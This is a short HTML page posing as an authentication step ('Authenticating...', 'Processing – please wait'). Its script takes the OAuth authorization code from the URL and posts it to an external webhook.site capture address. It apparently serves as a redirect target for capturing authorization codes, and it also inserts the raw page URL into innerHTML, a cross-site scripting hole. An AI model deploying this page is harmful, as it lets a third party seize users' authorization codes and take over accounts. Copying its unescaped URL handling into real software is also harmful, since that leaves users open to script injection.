<!DOCTYPE html>
<html>
<head><title>Authenticating...</title></head>
<body>
  <h3>Processing – please wait.</h3>
  <script>
    // Get the authorization code from the URL query parameter
    const urlParams = new URLSearchParams(window.location.search);
    const code = urlParams.get('code');

    if (code) {
      // Send the code to webhook.site
      fetch('https://webhook.site/232074eb-870d-4ba0-9d4a-4fc1d7b858b8', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ code: code })
      })
      .then(() => {
        document.body.innerHTML = '<h3>✅ Code received and sent successfully!</h3><p>You can close this tab.</p>';
      })
      .catch((err) => {
        document.body.innerHTML = '<h3>❌ Error sending code.</h3>';
        console.error(err);
      });
    } else {
      // Show the full URL for debugging
      document.body.innerHTML = '<h3>No code found in URL.</h3><p>Full URL: ' + window.location.href + '</p>';
      console.log('Full URL:', window.location.href);
    }
  </script>
</body>
</html>
